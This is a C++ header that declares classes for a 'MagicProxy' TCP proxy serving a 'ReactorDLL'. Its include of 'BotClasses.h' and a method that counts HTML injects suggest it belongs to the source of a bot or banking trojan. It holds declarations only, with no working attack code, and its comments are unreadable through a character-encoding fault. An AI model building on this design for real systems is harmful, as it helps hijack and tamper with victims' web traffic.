//---------------------------------------------------------------------------
//  ������� ������ ��� ����������� ������ ���������� Reactor
//---------------------------------------------------------------------------

#ifndef MagicProxyH
#define MagicProxyH
//---------------------------------------------------------------------------

#include "Strings.h"
#include "BotClasses.h"
#include "TCPClientServer.h"
#include "ReactorUtils.h"




class TProxyRequestCollection;


//*******************************************************
//  TProxyService
//
//  ������� ����� ������ �������
//*******************************************************
class TProxyService
{
private:
	BYTE FServiceID;
public:
	TProxyService(BYTE ID) { FServiceID = ID; }
	~TProxyService() {}
	bool virtual ProcessCommand(BYTE CommandID, const string& CommandData,
								string& ResponseData) { return false;  };

};



//*******************************************************
//  TReactorCommandService
//
//  ������ ��������� ������ ReactorDLL
//*******************************************************
class TReactorCommandService : public TProxyService
{
private:
	bool GetHTMLInjectsCount(const string& URL, string& Response);
public:
	TReactorCommandService() : TProxyService(REACTOR_COMMAND_SERVICE) {}
	~TReactorCommandService() {};

	bool ProcessCommand(BYTE CommandID, const string& CommandData,
						string& ResponseData);

};




//*******************************************************
//  TMagicProxy
//
//  ������ ����� ������� ReactorDLL �������� �����������
//  ���������� ��� ������ � ��������� � �.�.
//
//  /* TODO : ����������,  ��� ������ "� �.�." */
//
//*******************************************************
class TMagicProxy : public TTCPServer
{

private:
	TProxyRequestCollection* FRequests;
	TReactorCommandService *FCommandService;

	TProxyService* GetProxyService(BYTE ServiceID);
	bool ValidateRequest(PROXY_MAGIC_BUFFER *Request);
	void ProcessRequest(TTCPClient* Client, PReactorRequest Request, DWORD &ResponseCode, string &ResponseText);

	friend class TProxyServer;
protected:
	void DoProcessClient(TTCPClient* Client);
public:
	TMagicProxy(const char* IPAddress, WORD Port);
	~TMagicProxy();
};



//*******************************************************
//  ������������ ������ ��������� �������� �� ���������
//  � �������� �������� ����� ReactorDLL
//*******************************************************
class TProxyServer : public TTCPServer
{
private:
	void ProxyLoop(TTCPClient* Client, TTCPClient* Target);
	bool TransmitDataBetweenSockets(TTCPClient* Source, TTCPClient* Destination,
									TMemory &Buf,
									bool &Terminate, LPVOID DataHandler);
protected:
	TProxyRequestCollection* FRequests;
	void DoProcessClient(TTCPClient* Client);
public:
	TProxyServer(TMagicProxy &ReactorServer, const char* IPAddress, WORD Port);
};




//*******************************************************
//  TProxyRequest
//
//  �������� ����������� � ������ �������
//*******************************************************

class TProxyRequest : public TBotCollectionItem
{
public:
	bool  Transparent;
	WORD  ClientPort;
	DWORD Address;    // ����� �������� �����������
	WORD  Port;       // ���� �������� ����������

	TProxyRequest(TProxyRequestCollection* Owner, TReactorRequest &Request);
};



//*******************************************************
//  TProxyRequestCollection
//
//  ��������� �������� � ������ �������
//*******************************************************
class TProxyRequestCollection : public TBotCollection
{
public:
	TProxyRequestCollection();

	TProxyRequest* Find(WORD ClientPort);
};


//---------------------------------------------------------------------------
#endif

